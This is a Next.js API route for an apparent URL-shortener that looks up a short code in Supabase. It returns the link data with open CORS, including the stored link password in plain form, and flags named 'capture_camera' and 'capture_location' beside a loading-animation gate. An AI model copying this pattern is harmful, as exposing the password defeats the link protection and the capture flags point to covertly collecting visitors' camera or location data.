import { NextResponse } from 'next/server';
import { supabase } from '../../../../lib/supabase';

export async function OPTIONS() {
  return new NextResponse(null, {
    status: 200,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    },
  });
}

export async function GET(
  req: Request,
  { params }: { params: Promise<{ shortCode: string }> }
) {
  try {
    const { shortCode } = await params;
    if (!shortCode) {
      return NextResponse.json({ error: 'Short code is required' }, { status: 400 });
    }

    const { data, error } = await supabase
      .from('urls')
      .select('id, short_code, long_url, password, expires_at, social_gate_title, social_gate_url, social_gate_description, social_gate_button_text, social_gate_icon, animation_type, animation_text, capture_camera, capture_location')
      .eq('short_code', shortCode)
      .single();

    if (error || !data) {
      return NextResponse.json(
        { error: 'Link not found' },
        { status: 404, headers: { 'Access-Control-Allow-Origin': '*' } }
      );
    }

    // Check expiration
    const isExpired = data.expires_at ? new Date(data.expires_at) < new Date() : false;

    return NextResponse.json(
      {
        success: true,
        data: {
          id: data.id,
          short_code: data.short_code,
          long_url: data.long_url,
          has_password: Boolean(data.password),
          password: data.password || null,
          is_expired: isExpired,
          social_gate_title: data.social_gate_title || null,
          social_gate_url: data.social_gate_url || null,
          social_gate_description: data.social_gate_description || null,
          social_gate_button_text: data.social_gate_button_text || null,
          social_gate_icon: data.social_gate_icon || null,
          animation_type: data.animation_type || 'ring',
          animation_text: data.animation_text || 'LOADING',
          capture_camera: Boolean(data.capture_camera),
          capture_location: Boolean(data.capture_location),
        },
      },
      { headers: { 'Access-Control-Allow-Origin': '*' } }
    );
  } catch (err: any) {
    return NextResponse.json(
      { error: err?.message || 'Internal Server Error' },
      { status: 500, headers: { 'Access-Control-Allow-Origin': '*' } }
    );
  }
}
